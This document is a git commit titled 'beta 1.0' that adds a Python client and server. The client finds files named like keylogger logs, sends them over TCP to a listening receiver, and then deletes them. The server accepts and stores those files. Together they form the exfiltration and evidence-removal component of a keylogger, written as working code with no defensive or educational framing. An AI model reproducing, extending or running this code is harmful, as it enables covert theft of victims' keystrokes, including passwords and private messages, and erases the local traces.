18a981568f54cc8ac8c5d39fe43bffef2f368663
Hunter <hrick@mail.csuchico.edu>
2021-12-26 01:31:54 -0800

    beta 1.0

---
+++ client folder/client.py
@@ -0,0 +1,70 @@
+import socket
+import tqdm
+import os
+import re
+import urllib.request
+
+SEPARATOR = "<SEPARATOR>"
+BUFFER_SIZE = 4096 # send 4096 bytes each time step
+# the ip address or hostname of the server, the receiver
+
+host = socket.gethostname()
+# the port, let's use 5001
+port = 5002
+#regex pattern searching
+rootdir = os.getcwd()
+pattern = re.compile("^keylog-\d{4}-\d{2}-\d{2}-\d{6}_\d{4}-\d{2}-\d{2}-\d{6}\.txt$")
+
+# create the client socket
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+print(f"[+] Connecting to {host}:{port}")
+s.connect((host, port))
+print("[+] Connected.\n")
+
+while True:   
+    for root, dirs, files in os.walk(rootdir):
+        for file in files:
+            if pattern.match(file):
+                # the name of file we want to send, make sure it exists
+                print("Found matching filename\n")
+                filename = file
+                break
+        else:
+            print("closing client socket\n")
+            s.close()
+            exit()
+        
+        break                     
+
+    # get the file size
+    filesize = os.path.getsize(filename)
+    print("Filesize: ", filesize, "\n")
+    # send the filename and filesize
+    s.send(f"{filename}{SEPARATOR}{filesize}\n".encode())
+    print("sent the filename: ", filename, " of filesize: ", filesize, "\n")
+    # start sending the file
+    #progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "rb") as f:
+        while True:
+            # read the bytes from the file
+            bytes_read = f.read(BUFFER_SIZE)
+            print("read into file: ", bytes_read, "\n")
+            if not bytes_read:
+                print("0 bytes detected, closing file\n")
+                # file transmitting is done
+                f.close()
+                print("file closed\n")
+                os.remove(filename)
+                print("file removed\n")
+                break
+            # we use sendall to assure transimission in 
+            # busy networks
+            s.send(bytes_read)
+            print("sent ", bytes_read, " bytes.\n")
+            # update the progress bar
+            #progress.update(len(bytes_read))
+
+print("closing client socket")
+# close the socket
+s.close()
---
+++ server.py
@@ -0,0 +1,84 @@
+import re
+import socket
+import tqdm
+import os
+
+# device's IP address
+SERVER_HOST = "0.0.0.0"
+SERVER_PORT = 5002
+# receive 4096 bytes each time
+BUFFER_SIZE = 4096
+SEPARATOR = "<SEPARATOR>"
+
+# create the server socket
+# TCP socket
+s = socket.socket()
+
+# bind the socket to our local address
+s.bind((SERVER_HOST, SERVER_PORT))
+# enabling our server to accept connections
+# 5 here is the number of unaccepted connections that
+# the system will allow before refusing new connections
+s.listen(5)
+print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")
+# accept connection if there is any
+client_socket, address = s.accept() 
+# if below code is executed, that means the sender is connected
+print(f"[+] {address} is connected.\n")
+
+# receive the file infos
+# receive using client socket, not server socket
+
+while True:
+    
+    while True:
+        received = client_socket.recv(BUFFER_SIZE).decode()
+        if "\n" in received:
+            print("recieved: ", received, "\n")
+            break
+        elif received == '':
+            print("recieved is empty: ", received, "\n")
+            client_socket.close()
+            print("closed client_socket connection\n")
+            s.close()
+            print("closed server socket\n")
+            exit()
+    
+    filename, filesize = received.split(SEPARATOR)   
+    print("recieved split into filename: ", filename, " and filesize of: ", filesize, "\n")
+    # remove absolute path if there is
+    filename = os.path.basename(filename)
+    print("removed absolute filepath of file\n")
+    # convert to integer
+    filesize = int(filesize)
+    print("converted filesize to an integer\n")
+    # start receiving the file from the socket
+    # and writing to the file stream
+    #progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    with open(filename, "wb") as f:
+        while True:
+            # read 1024 bytes from the socket (receive)
+            bytes_read = client_socket.recv(BUFFER_SIZE)
+            print("recieved ", bytes_read, " bytes.\n") 
+            while bytes_read:
+                # write to the file the bytes we just received
+                f.write(bytes_read)
+                print("wrote bytes into file\n")
+                if "\n" in bytes_read.decode():
+                    break
+                # update the progress bar
+                #progress.update(len(bytes_read))
+                bytes_read = client_socket.recv(BUFFER_SIZE)
+                print("wrote ", bytes_read, " bytes.\n")
+            
+            print("Bytes should be empty here, bytes: ", bytes_read, "\n") 
+            break      
+    f.close()
+    print("closed file\n")  
+    received = ''            
+    print("set recived to: ", received, "\n")
+# close the client socket
+client_socket.close()
+# close the server socket
+s.close()
+exit()
